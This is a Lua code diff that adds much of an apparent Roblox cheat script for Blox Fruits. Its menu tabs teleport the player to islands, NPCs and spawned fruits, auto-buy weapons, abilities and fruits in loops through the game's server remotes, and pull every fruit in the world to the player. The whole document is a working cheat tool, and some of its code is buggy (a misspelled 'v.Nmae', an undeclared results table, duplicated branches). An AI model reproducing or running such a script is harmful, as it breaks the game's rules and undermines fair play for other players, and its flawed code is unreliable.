+				topos(CFrame.new(-3032.7641601563, 317.89672851563, -10075.373046875));
+			elseif _G.SelectIsland == "Ussop Island" then
+				topos(CFrame.new(4816.8618164063, 8.4599885940552, 2863.8195800781));
+			elseif _G.SelectIsland == "Mini Sky Island" then
+				topos(CFrame.new(-288.74060058594, 49326.31640625, -35248.59375));
+			elseif _G.SelectIsland == "Great Tree" then
+				topos(CFrame.new(2681.2736816406, 1682.8092041016, -7190.9853515625));
+			elseif _G.SelectIsland == "Castle On The Sea" then
+				topos(CFrame.new(-5074.45556640625, 314.5155334472656, -2991.054443359375));
+			elseif _G.SelectIsland == "MiniSky" then
+				topos(CFrame.new(-260.65557861328, 49325.8046875, -35253.5703125));
+			elseif _G.SelectIsland == "Port Town" then
+				topos(CFrame.new(-290.7376708984375, 6.729952812194824, 5343.5537109375));
+			elseif _G.SelectIsland == "Hydra Island" then
+				topos(CFrame.new(5228.8842773438, 604.23400878906, 345.0400390625));
+			elseif _G.SelectIsland == "Floating Turtle" then
+				topos(CFrame.new(-13274.528320313, 531.82073974609, -7579.22265625));
+			elseif _G.SelectIsland == "Mansion" then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-12471.169921875, 374.94024658203, -7551.677734375));
+			elseif _G.SelectIsland == "Haunted Castle" then
+				topos(CFrame.new(-9515.3720703125, 164.00624084473, 5786.0610351562));
+			elseif _G.SelectIsland == "Ice Cream Island" then
+				topos(CFrame.new(-902.56817626953, 79.93204498291, -10988.84765625));
+			elseif _G.SelectIsland == "Peanut Island" then
+				topos(CFrame.new(-2062.7475585938, 50.473892211914, -10232.568359375));
+			elseif _G.SelectIsland == "Cake Island" then
+				topos(CFrame.new(-1884.7747802734375, 19.327526092529297, -11666.8974609375));
+			elseif _G.SelectIsland == "Cocoa Island" then
+				topos(CFrame.new(87.94276428222656, 73.55451202392578, -12319.46484375));
+			elseif _G.SelectIsland == "Candy Island" then
+				topos(CFrame.new(-1014.4241943359375, 149.11068725585938, -14555.962890625));
+			elseif _G.SelectIsland == "Tiki Outpost" then
+				topos(CFrame.new(-16218.6826, 9.08636189, 445.618408, -0.0610186495, 0.00000000110512588, -0.99813664, -0.0000000183458475, 1, 0.00000000222871765, 0.99813664, 0.0000000184476558, -0.0610186495));
+			end;
+		until not _G.TeleportIsland;
+	end;
+	StopTween(_G.TeleportIsland);
+end);
+TeleportTab:Seperator("Npc");
+if World1 then
+	TeleportTab:Dropdown("Select NPC", {
+		"Random Devil Fruit",
+		"Blox Fruits Dealer",
+		"Remove Devil Fruit",
+		"Ability Teacher",
+		"Dark Step",
+		"Electro",
+		"Fishman Karate"
+	}, false, function(value)
+		_G.SelectNPC = value;
+	end);
+end;
+if World2 then
+	TeleportTab:Dropdown("Select NPC", {
+		"Dargon Berath",
+		"Mtsterious Man",
+		"Mysterious Scientist",
+		"Awakening Expert",
+		"Nerd",
+		"Bar Manager",
+		"Blox Fruits Dealer",
+		"Trevor",
+		"Enhancement Editor",
+		"Pirate Recruiter",
+		"Marines Recruiter",
+		"Chemist",
+		"Cyborg",
+		"Ghoul Mark",
+		"Guashiem",
+		"El Admin",
+		"El Rodolfo",
+		"Arowe"
+	}, false, function(value)
+		_G.SelectNPC = value;
+	end);
+end;
+if World3 then
+	TeleportTab:Dropdown("Select NPC", {
+		"Blox Fruits Dealer",
+		"Remove Devil Fruit",
+		"Horned Man",
+		"Hungey Man",
+		"Previous Hero",
+		"Butler",
+		"Lunoven",
+		"Trevor",
+		"Elite Hunter",
+		"Player Hunter",
+		"Uzoth"
+	}, false, function(value)
+		_G.SelectNPC = value;
+	end);
+end;
+TeleportTab:Toggle("Teleport", _G.TeleportNPC, "Tween To Npc", function(value)
+	_G.TeleportNPC = value;
+	if _G.TeleportNPC == true then
+		repeat
+			wait();
+			if _G.SelectNPC == "Dargon Berath" then
+				topos(CFrame.new(703.372986, 186.985519, 654.522034, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Mtsterious Man" then
+				topos(CFrame.new(-2574.43335, 1627.92371, -3739.35767, 0.378697902, -0.00000000906400288, 0.92552036, -0.00000000895582009, 1, 0.0000000134578926, -0.92552036, -0.0000000133852689, 0.378697902));
+			elseif _G.SelectNPC == "Mysterious Scientist" then
+				topos(CFrame.new(-6437.87793, 250.645355, -4498.92773, 0.502376854, -0.0000000101223634, -0.864648759, 0.0000000234106086, 1, 0.00000000189508653, 0.864648759, -0.0000000211940012, 0.502376854));
+			elseif _G.SelectNPC == "Awakening Expert" then
+				topos(CFrame.new(-408.098846, 16.0459061, 247.432846, 0.028394036, 0.000000000617599138, 0.999596894, -0.00000000557905944, 1, -0.000000000459372484, -0.999596894, -0.00000000556376767, 0.028394036));
+			elseif _G.SelectNPC == "Nerd" then
+				topos(CFrame.new(-401.783722, 73.0859299, 262.306702, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Bar Manager" then
+				topos(CFrame.new(-385.84726, 73.0458984, 316.088806, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Blox Fruits Dealer" then
+				topos(CFrame.new(-450.725464, 73.0458984, 355.636902, -0.780352175, -0.000000027266168, 0.625340283, 0.00000000978516468, 1, 0.0000000558128797, -0.625340283, 0.0000000496727601, -0.780352175));
+			elseif _G.SelectNPC == "Trevor" then
+				topos(CFrame.new(-341.498322, 331.886444, 643.024963, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Plokster" then
+				topos(CFrame.new(-1885.16016, 88.3838196, -1912.28723, -0.513468027, 0, 0.858108759, 0, 1, 0, -0.858108759, 0, -0.513468027));
+			elseif _G.SelectNPC == "Enhancement Editor" then
+				topos(CFrame.new(-346.820221, 72.9856339, 1194.36218, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Pirate Recruiter" then
+				topos(CFrame.new(-428.072998, 72.9495239, 1445.32422, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Marines Recruiter" then
+				topos(CFrame.new(-1349.77295, 72.9853363, -1045.12964, 0.866493046, 0, -0.499189168, 0, 1, 0, 0.499189168, 0, 0.866493046));
+			elseif _G.SelectNPC == "Chemist" then
+				topos(CFrame.new(-2777.45288, 72.9919434, -3572.25732, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Ghoul Mark" then
+				topos(CFrame.new(635.172546, 125.976357, 33219.832, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Cyborg" then
+				topos(CFrame.new(629.146851, 312.307373, -531.624146, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Guashiem" then
+				topos(CFrame.new(937.953003, 181.083359, 33277.9297, 1, -0.0000000860126406, 0.0000000000000000381773896, 0.0000000860126406, 1, -0.000000000000000189969598, -0.000000000000000038177373, 0.000000000000000189969598, 1));
+			elseif _G.SelectNPC == "El Admin" then
+				topos(CFrame.new(1322.80835, 126.345039, 33135.8789, 0.988783717, -0.0000000869797603, -0.149354503, 0.0000000862223786, 1, -0.0000000115461916, 0.149354503, -0.00000000146101409, 0.988783717));
+			elseif _G.SelectNPC == "El Rodolfo" then
+				topos(CFrame.new(941.228699, 40.4686775, 32778.9922, -0.818029106, -0.0000000119524382, 0.575176775, -0.0000000128741648, 1, 0.00000000247053866, -0.575176775, -0.00000000538394795, -0.818029106));
+			elseif _G.SelectNPC == "Arowe" then
+				topos(CFrame.new(-1994.51038, 125.519142, -72.2622986, -0.16715166, -0.0000000655417338, -0.985931218, -0.0000000713315558, 1, -0.0000000543836585, 0.985931218, 0.0000000612376851, -0.16715166));
+			elseif _G.SelectNPC == "Random Devil Fruit" then
+				topos(CFrame.new(-1436.19727, 61.8777695, 4.75247526, -0.557794094, 0.0000000274216543, 0.829979479, 0.0000000583273234, 1, 0.00000000616037932, -0.829979479, 0.0000000518467118, -0.557794094));
+			elseif _G.SelectNPC == "Blox Fruits Dealer" then
+				topos(CFrame.new(-923.255066, 7.67800522, 1608.61011, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Remove Devil Fruit" then
+				topos(CFrame.new(5664.80469, 64.677681, 867.85907, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Ability Teacher" then
+				topos(CFrame.new(-1057.67822, 9.65220833, 1799.49146, -0.865874112, -0.0000000926330159, 0.500262439, -0.0000000733759435, 1, 0.00000005816689, -0.500262439, 0.0000000136579752, -0.865874112));
+			elseif _G.SelectNPC == "Dark Step" then
+				topos(CFrame.new(-987.873047, 13.7778397, 3989.4978, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Electro" then
+				topos(CFrame.new(-5389.49561, 13.283, -2149.80151, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Fishman Karate" then
+				topos(CFrame.new(61581.8047, 18.8965912, 987.832703, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+			elseif _G.SelectNPC == "Random Devil Fruit" then
+				topos(CFrame.new(-12491, 337, -7449));
+			elseif _G.SelectNPC == "Blox Fruits Dealer" then
+				topos(CFrame.new(-12511, 337, -7448));
+			elseif _G.SelectNPC == "Remove Devil Fruit" then
+				topos(CFrame.new(-5571, 1089, -2661));
+			elseif _G.SelectNPC == "Horned Man" then
+				topos(CFrame.new(-11890, 931, -8760));
+			elseif _G.SelectNPC == "Hungey Man" then
+				topos(CFrame.new(-10919, 624, -10268));
+			elseif _G.SelectNPC == "Previous Hero" then
+				topos(CFrame.new(-10368, 332, -10128));
+			elseif _G.SelectNPC == "Butler" then
+				topos(CFrame.new(-5125, 316, -3130));
+			elseif _G.SelectNPC == "Lunoven" then
+				topos(CFrame.new(-5117, 316, -3093));
+			elseif _G.SelectNPC == "Elite Hunter" then
+				topos(CFrame.new(-5420, 314, -2828));
+			elseif _G.SelectNPC == "Player Hunter" then
+				topos(CFrame.new(-5559, 314, -2840));
+			elseif _G.SelectNPC == "Uzoth" then
+				topos(CFrame.new(-9785, 852, 6667));
+			end;
+		until not _G.TeleportNPC;
+	end;
+	StopTween(_G.TeleportNPC);
+end);
+ShopTab:Seperator("Legendary Sword");
+ShopTab:Toggle("Auto Buy Legendary Sword", _G.AutoBuyLegendarySword, "Buy Legendary Sword When Spawn", function(value)
+	_G.AutoBuyLegendarySword = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoBuyLegendarySword then
+			pcall(function()
+				local args = {
+					[1] = "LegendarySwordDealer",
+					[2] = "1"
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+				local args = {
+					[1] = "LegendarySwordDealer",
+					[2] = "2"
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+				local args = {
+					[1] = "LegendarySwordDealer",
+					[2] = "3"
+				};
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+			end);
+		end;
+	end;
+end);
+ShopTab:Seperator("Haki Color");
+ShopTab:Toggle("Auto Buy Haki Color", _G.AutoBuyEnchancementColour, "Auto Buy Haki Color", function(value)
+	_G.AutoBuyEnchancementColour = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoBuyEnchancementColour then
+			local args = {
+				[1] = "ColorsDealer",
+				[2] = "2"
+			};
+			(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+		end;
+	end;
+end);
+ShopTab:Seperator("Abilities");
+ShopTab:Button("Buy Geppo [ $10,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Geppo");
+end);
+ShopTab:Button("Buy Buso Haki [ $25,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Buso");
+end);
+ShopTab:Button("Buy Soru [ $25,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Soru");
+end);
+ShopTab:Button("Buy Observation Haki [ $750,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KenTalk", "Buy");
+end);
+ShopTab:Toggle("Auto Buy Abilities", false, "Auto Buy Haki", function(t)
+	Abilities = t;
+	while Abilities do
+		wait(0.1);
+		(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Geppo");
+		(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Buso");
+		(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyHaki", "Soru");
+	end;
+end);
+ShopTab:Seperator("Boats");
+BoatList = {
+	"Pirate Sloop",
+	"Enforcer",
+	"Rocket Boost",
+	"Dinghy",
+	"Pirate Basic",
+	"Pirate Brigade"
+};
+spawn(function()
+	while wait() do
+		pcall(function()
+			if SelectBoat == "Pirate Sloop" then
+				_G.SelectBoat = "PirateSloop";
+			elseif SelectBoat == "Enforcer" then
+				_G.SelectBoat = "Enforcer";
+			elseif SelectBoat == "RocketBoost" then
+				_G.SelectBoat = "RocketBoost";
+			elseif SelectBoat == "PirateBasic" then
+				_G.SelectBoat = "PirateBasic";
+			elseif SelectBoat == "Pirate Brigade" then
+				_G.SelectBoat = "PirateBrigade";
+			end;
+		end);
+	end;
+end);
+ShopTab:Dropdown("Select Boats", BoatList, false, function(value)
+	SelectBoat = value;
+end);
+ShopTab:Button("Buy Boat", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectBoat);
+end);
+ShopTab:Seperator("Fighting Style");
+ShopTab:Button("Buy Black Leg [ $150,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBlackLeg");
+end);
+ShopTab:Button("Buy Electro [ $550,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectro");
+end);
+ShopTab:Button("Buy Water Kung Fu [ $750,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyFishmanKarate");
+end);
+ShopTab:Button("Buy Dragon Claw [ ƒ1,500 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1");
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2");
+end);
+ShopTab:Button("Buy Superhuman [ $3,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySuperhuman");
+end);
+ShopTab:Button("Buy Death Step [ ƒ5,000 $5,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDeathStep");
+end);
+ShopTab:Button("Buy Sharkman Karate [ ƒ5,000 $2,500,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate", true);
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySharkmanKarate");
+end);
+ShopTab:Button("Buy Electric Claw [ ƒ5,000 $3,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyElectricClaw");
+end);
+ShopTab:Button("Buy Dragon Talon [ ƒ5,000 $3,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyDragonTalon");
+end);
+ShopTab:Button("Buy God Human [ ƒ5,000 $5,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyGodhuman");
+end);
+ShopTab:Button("Buy Sanguine Art [ ƒ5,000 $5,000,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySanguineArt", true);
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuySanguineArt");
+end);
+ShopTab:Seperator("Sword");
+ShopTab:Button("Cutlass [ $1,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Cutlass");
+end);
+ShopTab:Button("Katana [ $1,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Katana");
+end);
+ShopTab:Button("Iron Mace [ $25,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Iron Mace");
+end);
+ShopTab:Button("Dual Katana [ $12,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Duel Katana");
+end);
+ShopTab:Button("Triple Katana [ $60,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Triple Katana");
+end);
+ShopTab:Button("Pipe [ $100,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Pipe");
+end);
+ShopTab:Button("Dual-Headed Blade [ $400,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Dual-Headed Blade");
+end);
+ShopTab:Button("Bisento [ $1,200,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Bisento");
+end);
+ShopTab:Button("Soul Cane [ $750,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Soul Cane");
+end);
+ShopTab:Button("Pole v.2 [ ƒ5,000 ]", function()
+	game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ThunderGodTalk");
+end);
+ShopTab:Seperator("Gun");
+ShopTab:Button("Slingshot [ $5,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Slingshot");
+end);
+ShopTab:Button("Musket [ $8,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Musket");
+end);
+ShopTab:Button("Flintlock [ $10,500 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Flintlock");
+end);
+ShopTab:Button("Refined Slingshot [ $30,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Refined Flintlock");
+end);
+ShopTab:Button("Refined Flintlock [ $65,000 ]", function()
+	local args = {
+		[1] = "BuyItem",
+		[2] = "Refined Flintlock"
+	};
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+end);
+ShopTab:Button("Cannon [ $100,000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyItem", "Cannon");
+end);
+ShopTab:Button("Kabucha [ ƒ1,500]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "1");
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Slingshot", "2");
+end);
+ShopTab:Button("Bizarre Rifle [ 250 Ectoplasm ]", function()
+	local A_1 = "Ectoplasm";
+	local A_2 = "Buy";
+	local A_3 = 1;
+	local Event = (game:GetService("ReplicatedStorage")).Remotes.CommF_;
+	Event:InvokeServer(A_1, A_2, A_3);
+end);
+ShopTab:Seperator("Bones");
+ShopTab:Button("Buy Surprise [ 50 Bone ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1);
+end);
+ShopTab:Button("Stat Refund [ 50 Bone ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 2);
+end);
+ShopTab:Button("Race Reroll [ 50 Bone ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 3);
+end);
+ShopTab:Seperator("Stats");
+ShopTab:Button("Reset Stats [ Use ƒ2,500 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "1");
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2");
+end);
+ShopTab:Button("Random Race [ Use ƒ3000 ]", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "1");
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2");
+end);
+ShopTab:Seperator("Accessories");
+ShopTab:Button("Black Cape [ $50,000 ]", function()
+	local args = {
+		[1] = "BuyItem",
+		[2] = "Black Cape"
+	};
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+end);
+ShopTab:Button("Swordsman Hat [ $150,000 ]", function()
+	local args = {
+		[1] = "BuyItem",
+		[2] = "Swordsman Hat"
+	};
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+end);
+ShopTab:Button("Tomoe Ring [ $500,000 ]", function()
+	local args = {
+		[1] = "BuyItem",
+		[2] = "Tomoe Ring"
+	};
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+end);
+FruitTab:Seperator("Fruits");
+FruitTab:Toggle("Auto Random Fruit", _G.Random_Auto, "Auto Buy Random Fruit", function(value)
+	_G.Random_Auto = value;
+end);
+spawn(function()
+	pcall(function()
+		while wait(0.1) do
+			if _G.Random_Auto then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Cousin", "Buy");
+			end;
+		end;
+	end);
+end);
+FruitTab:Button("Random Fruit", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Cousin", "Buy");
+end);
+FruitTab:Button("Open Devil Shop", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("GetFruits");
+	(game:GetService("Players")).LocalPlayer.PlayerGui.Main.FruitShop.Visible = true;
+end);
+local RarityFruits = {
+	Common = {
+		"Rocket Fruit",
+		"Spin Fruit",
+		"Chop Fruit",
+		"Spring Fruit",
+		"Bomb Fruit",
+		"Smoke Fruit",
+		"Spike Fruit"
+	},
+	Uncommon = {
+		"Flame Fruit",
+		"Falcon Fruit",
+		"Ice Fruit",
+		"Sand Fruit",
+		"Diamond Fruit",
+		"Dark Fruit"
+	},
+	Rare = {
+		"Light Fruit",
+		"Rubber Fruit",
+		"Barrier Fruit",
+		"Ghost Fruit",
+		"Magma Fruit"
+	},
+	Legendary = {
+		"Quake Fruit",
+		"Budha Fruit",
+		"Love Fruit",
+		"Spider Fruit",
+		"Sound Fruit",
+		"Phoenix Fruit",
+		"Portal Fruit",
+		"Rumble Fruit",
+		"Pain Fruit",
+		"Blizzard Fruit"
+	},
+	Mythical = {
+		"Gravity Fruit",
+		"Mammoth Fruit",
+		"T-Rex Fruit",
+		"Dough Fruit",
+		"Shadow Fruit",
+		"Venom Fruit",
+		"Control Fruit",
+		"Spirit Fruit",
+		"Dragon Fruit",
+		"Leopard Fruit",
+		"Kitsune Fruit"
+	}
+};
+local SelectRarityFruits = {
+	"Common - Mythical",
+	"Uncommon - Mythical",
+	"Rare - Mythical",
+	"Legendary - Mythical",
+	"Mythical"
+};
+local ResultUnstoreFruits = {};
+SetRarityFruits = "Common - Mythical";
+FruitTab:Dropdown("Store Rarity Fruits", SelectRarityFruits, SetRarityFruits, function(x)
+	SetRarityFruits = x;
+end);
+function CheckFruits()
+	for i, v in pairs(RarityFruits) do
+		if SetRarityFruits == "Common - Mythical" then
+			if i == "Common" or i == "Uncommon" or i == "Rare" or i == "Legendary" or i == "Mythical" then
+				for _, fruit in ipairs(v) do
+					table.insert(ResultStoreFruits, fruit);
+				end;
+			end;
+		elseif SetRarityFruits == "Uncommon - Mythical" then
+			if i == "Uncommon" or i == "Rare" or i == "Legendary" or i == "Mythical" then
+				for _, fruit in ipairs(v) do
+					table.insert(ResultStoreFruits, fruit);
+				end;
+			end;
+		elseif SetRarityFruits == "Rare - Mythical" then
+			if i == "Rare" or i == "Legendary" or i == "Mythical" then
+				for _, fruit in ipairs(v) do
+					table.insert(ResultStoreFruits, fruit);
+				end;
+			end;
+		elseif SetRarityFruits == "Legendary - Mythical" then
+			if i == "Legendary" or i == "Mythical" then
+				for _, fruit in ipairs(v) do
+					table.insert(ResultStoreFruits, fruit);
+				end;
+			end;
+		elseif SetRarityFruits == "Mythical" then
+			if i == "Mythical" then
+				for _, fruit in ipairs(v) do
+					table.insert(ResultStoreFruits, fruit);
+				end;
+			end;
+		end;
+	end;
+end;
+FruitTab:Toggle("Auto Store Fruit", _G.AutoStoreFruit, "Store Fruit", function(value)
+	_G.AutoStoreFruit = value;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.AutoStoreFruit then
+				for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+					if string.find(v.Name, "Fruit") then
+						ResultStoreFruits = {};
+						CheckFruits();
+						for z, Res in pairs(ResultStoreFruits) do
+							if v.Name == Res then
+								local NameFruit = v.Name;
+								local FirstNameFruit = string.gsub(v.Name, " Fruit", "");
+								if (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild(NameFruit) then
+									(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StoreFruit", FirstNameFruit .. "-" .. FirstNameFruit, (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild(NameFruit));
+								end;
+							end;
+						end;
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+FruitTab:Toggle("Fruit Notification", _G.Grabfruit, "Add Notification When Fruit Spawn", function(value)
+	_G.FruitCheck = value;
+end);
+spawn(function()
+	while wait(2) do
+		if _G.FruitCheck then
+			for i, v in pairs(game.Workspace:GetChildren()) do
+				if string.find(v.Name, "Fruit") then
+					Alert:create("Fruit : " .. v.Nmae);
+				end;
+			end;
+		end;
+	end;
+end);
+FruitTab:Toggle("Teleport To Fruit", _G.Grabfruit, "Teleport To Fruit Instant", function(value)
+	_G.Grabfruit = value;
+end);
+spawn(function()
+	while wait(0.1) do
+		if _G.Grabfruit then
+			for i, v in pairs(game.Workspace:GetChildren()) do
+				if string.find(v.Name, "Fruit") then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Handle.CFrame;
+				end;
+			end;
+		end;
+	end;
+end);
+FruitTab:Toggle("Tween To Fruit", _G.Tweenfruit, "Teleport To Fruit Using Tween", function(value)
+	_G.Tweenfruit = value;
+	StopTween(_G.Tweenfruit);
+end);
+spawn(function()
+	while wait(0.1) do
+		if _G.Tweenfruit then
+			for i, v in pairs(game.Workspace:GetChildren()) do
+				if string.find(v.Name, "Fruit") then
+					topos(v.Handle.CFrame);
+				end;
+			end;
+		end;
+	end;
+end);
+FruitTab:Button("Grab All Fruits", function()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		if v:IsA("Tool") then
+			v.Handle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
+		end;
+	end;
+end);
+FruitTab:Seperator("Visual");
+FruitTab:Button("Rain Fruit", function()
+	for h, i in pairs((game:GetObjects("rbxassetid://14759368201"))[1]:GetChildren()) do
+		i.Parent = game.Workspace.Map;
+		i:MoveTo(game.Players.LocalPlayer.Character.PrimaryPart.Position + Vector3.new(math.random((-50), 50), 100, math.random((-50), 50)));
+		if i.Fruit:FindFirstChild("AnimationController") then
+			((i.Fruit:FindFirstChild("AnimationController")):LoadAnimation(i.Fruit:FindFirstChild("Idle"))):Play();
+		end;
+		i.Handle.Touched:Connect(function(cR)
+			if cR.Parent == game.Players.LocalPlayer.Character then
+				i.Parent = game.Players.LocalPlayer.Backpack;
+				game.Players.LocalPlayer.Character.Humanoid:EquipTool(i);
+			end;
+		end);
+	end;
+end);
+MiscTab:Seperator("Misc");
+MiscTab:Button("Open Devil Shop", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("GetFruits");
+	(game:GetService("Players")).LocalPlayer.PlayerGui.Main.FruitShop.Visible = true;
+end);
+MiscTab:Button("Open Haki Color", function()
+	game.Players.localPlayer.PlayerGui.Main.Colors.Visible = true;
+end);
+MiscTab:Button("Open Title Name", function()
+	local args = {
+		[1] = "getTitles"
+	};
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+	game.Players.localPlayer.PlayerGui.Main.Titles.Visible = true;
+end);
+MiscTab:Button("Open Inventory", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventoryWeapons");
+	wait(1);
+	(game:GetService("Players")).LocalPlayer.PlayerGui.Main.Inventory.Visible = true;
+end);
+MiscTab:Button("Open Inventory Fruit", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventoryFruits");
+	(game:GetService("Players")).LocalPlayer.PlayerGui.Main.FruitInventory.Visible = true;
+end);
+MiscTab:Seperator("Teams");
+MiscTab:Button("Join Pirates Team", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetTeam", "Pirates");
+end);
+MiscTab:Button("Join Marines Team", function()
+	(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("SetTeam", "Marines");
+end);
+MiscTab:Seperator("Highlight");
+MiscTab:Toggle("Hide Chat", _G.chat, "Invisible Chat", function(value)
+	_G.chat = value;
+	if _G.chat == true then
+		local StarterGui = game:GetService("StarterGui");
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false);
+	elseif _G.chat == false then
